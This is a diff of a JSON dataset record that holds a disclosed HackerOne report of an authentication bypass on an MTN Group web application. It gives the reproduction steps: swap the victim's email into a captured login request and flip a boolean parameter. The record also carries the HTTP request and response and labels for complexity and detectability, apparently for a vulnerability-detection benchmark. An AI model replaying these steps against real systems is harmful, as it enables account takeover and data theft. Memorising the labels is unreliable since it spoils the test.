@@ -1,60 +1,60 @@
 {
-    "reported_to": "MTN Group",
-    "reported_by": "reachaxis ",
-    "title": "Authentication Bypass Leads To  Complete Account TakeveOver on \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
-    "content": "\nSummary:\nHello Team,\nWhen an invalid email address/password is entered, the Web Application will not authenticate the user. But nevertheless, it is conceivable for an attacker to get around authentication and log in as anyone else, leading to Complete Account Takeover.\nSteps To Reproduce:\nCreate Two Test Account (Attacker & Victim)\nUsing attacker's account, login at \u2588\u2588\u2588\u2588\u2588\u2588\u2588\nCapture request with Burp.\nWithout sending request to \"Burp Repeater\", modify attacker's email to victim's email. For example REDACTED+\u2588\u2588\u2588\u2588\u2588\u2588 to REDACTED+\u2588\u2588\u2588\u2588\u2588.\nChange the param value:false, to value:true, and click send.\nNotice, attacker has successfully bypassed the authentication to login as the victim without any interaction.\nSupporting Material/References:\n\u2588\u2588\u2588\nRequest\nCode 467 Bytes\n1POST /app/login HTTP/1.1\n2Host: mtnmobad.mtnbusiness.com.ng\n3Cookie: \u2588\u2588\u2588\u2588\u2588\n4User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.27 Safari/537.36\n5....snip....\n6Connection: close\n7{\n8\t\"params\":{\n9\t\t\"updates\":[\n10\t\t{\n11\t\t\t\"param\":\"user\",\n12\t\t\t\"value\":{\n13\t\t\t\t\"userEmail\":\"REDACTED+\u2588\u2588\u2588\u2588\u2588\u2588\",\n14\t\t\t\t\"userPassword\":\"#######\"\n15\t\t\t\t},\n16\t\t\t\t\"op\":\"a\"\n17\t\t\t\t},\n18\t\t\t\t{\n19\t\t\t\t\t\"param\":\"gateway\",\n20\t\t\t\t\t\"value\":true,\n21\t\t\t\t\t\"op\":\"a\"\n22\t\t\t\t\t}\n23\t\t\t\t\t],\n24....more....\nResponse\nCode 174 Bytes\n1HTTP/1.1 200 OK\n2Server: nginx\n3....snip....\n4{\n5\t\"error\":false,\n6\t\"response\":{\n7\t\t\"id\":\"/703\",\n8\t\"name\":\"Victim ******\",\n9\t\"type\":\"Account\",\n10\t\"level\":0,\n11\t\"notes\":{\n12\t\t},\n13....more....\n\u2588\u2588\u2588\u2588\u2588\u2588\n[attachment / reference]\n\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\nSupposing there are 100,000 users available, a malicious actor will enumerate all 100,000 emails for all users to achieve a mass account takeover. Additionally, an attacker can lockdown an account, delete an account, change account info, and perform large data leaks.\n\n",
-    "severity": [
-        10.0,
-        null
+  "reported_to": "MTN Group",
+  "reported_by": "reachaxis ",
+  "title": "Authentication Bypass Leads To  Complete Account TakeveOver on \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
+  "content": "\nSummary:\nHello Team,\nWhen an invalid email address/password is entered, the Web Application will not authenticate the user. But nevertheless, it is conceivable for an attacker to get around authentication and log in as anyone else, leading to Complete Account Takeover.\nSteps To Reproduce:\nCreate Two Test Account (Attacker & Victim)\nUsing attacker's account, login at \u2588\u2588\u2588\u2588\u2588\u2588\u2588\nCapture request with Burp.\nWithout sending request to \"Burp Repeater\", modify attacker's email to victim's email. For example REDACTED+\u2588\u2588\u2588\u2588\u2588\u2588 to REDACTED+\u2588\u2588\u2588\u2588\u2588.\nChange the param value:false, to value:true, and click send.\nNotice, attacker has successfully bypassed the authentication to login as the victim without any interaction.\nSupporting Material/References:\n\u2588\u2588\u2588\nRequest\nCode 467 Bytes\n1POST /app/login HTTP/1.1\n2Host: mtnmobad.mtnbusiness.com.ng\n3Cookie: \u2588\u2588\u2588\u2588\u2588\n4User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.27 Safari/537.36\n5....snip....\n6Connection: close\n7{\n8\t\"params\":{\n9\t\t\"updates\":[\n10\t\t{\n11\t\t\t\"param\":\"user\",\n12\t\t\t\"value\":{\n13\t\t\t\t\"userEmail\":\"REDACTED+\u2588\u2588\u2588\u2588\u2588\u2588\",\n14\t\t\t\t\"userPassword\":\"#######\"\n15\t\t\t\t},\n16\t\t\t\t\"op\":\"a\"\n17\t\t\t\t},\n18\t\t\t\t{\n19\t\t\t\t\t\"param\":\"gateway\",\n20\t\t\t\t\t\"value\":true,\n21\t\t\t\t\t\"op\":\"a\"\n22\t\t\t\t\t}\n23\t\t\t\t\t],\n24....more....\nResponse\nCode 174 Bytes\n1HTTP/1.1 200 OK\n2Server: nginx\n3....snip....\n4{\n5\t\"error\":false,\n6\t\"response\":{\n7\t\t\"id\":\"/703\",\n8\t\"name\":\"Victim ******\",\n9\t\"type\":\"Account\",\n10\t\"level\":0,\n11\t\"notes\":{\n12\t\t},\n13....more....\n\u2588\u2588\u2588\u2588\u2588\u2588\n[attachment / reference]\n\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\nSupposing there are 100,000 users available, a malicious actor will enumerate all 100,000 emails for all users to achieve a mass account takeover. Additionally, an attacker can lockdown an account, delete an account, change account info, and perform large data leaks.\n\n",
+  "severity": [
+    10.0,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Authentication Bypass Using an Alternate Path or Channel"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1726332480,
+  "report_url": "https://hackerone.com/reports/1709881",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Create two test accounts (Attacker & Victim)."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Authentication Bypass Using an Alternate Path or Channel"
+    [
+      2,
+      "Using the attacker's account, log in and capture the request with Burp."
     ],
-    "screenshots": {},
-    "disclosed_date": 1726332480,
-    "report_url": "https://hackerone.com/reports/1709881",
-    "is_multi_component": false,
-    "complexity": "MEDIUM",
-    "novelty": "MEDIUM",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Create two test accounts (Attacker & Victim)."
-        ],
-        [
-            2,
-            "Using the attacker's account, log in and capture the request with Burp."
-        ],
-        [
-            3,
-            "Modify the attacker's email to the victim's email in the captured request."
-        ],
-        [
-            4,
-            "Change the param value from 'false' to 'true' and send the request."
-        ],
-        [
-            5,
-            "Observe that the attacker has successfully bypassed authentication and logged in as the victim."
-        ]
+    [
+      3,
+      "Modify the attacker's email to the victim's email in the captured request."
     ],
-    "vuln_description": "The vulnerability allows an attacker to bypass authentication by modifying the email parameter and changing a boolean value in the request, leading to a complete account takeover without any interaction from the victim.",
-    "reason": "The vulnerability involves a straightforward manipulation of request parameters without requiring deep understanding of complex application states or novel logic. The steps are linear and do not involve subtle interactions between components.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": false,
-    "authnz_byppass_detectable": true,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": false,
-        "authnz_byppass_detectable": true
-    }
+    [
+      4,
+      "Change the param value from 'false' to 'true' and send the request."
+    ],
+    [
+      5,
+      "Observe that the attacker has successfully bypassed authentication and logged in as the victim."
+    ]
+  ],
+  "vuln_description": "The vulnerability allows an attacker to bypass authentication by modifying the email parameter and changing a boolean value in the request, leading to a complete account takeover without any interaction from the victim.",
+  "reason": "The vulnerability involves a straightforward manipulation of request parameters without requiring deep understanding of complex application states or novel logic. The steps are linear and do not involve subtle interactions between components.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": false,
+  "authnz_byppass_detectable": true,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves modifying the email parameter in the login request to bypass authentication, which fits the methodology of testing authorization boundaries by swapping resource_ids (emails) with existing actions. This is covered by test e) in the methodology, which involves substituting resource_ids with new ones and executing with existing users.",
+    "is_detectable": true
+  }
 }
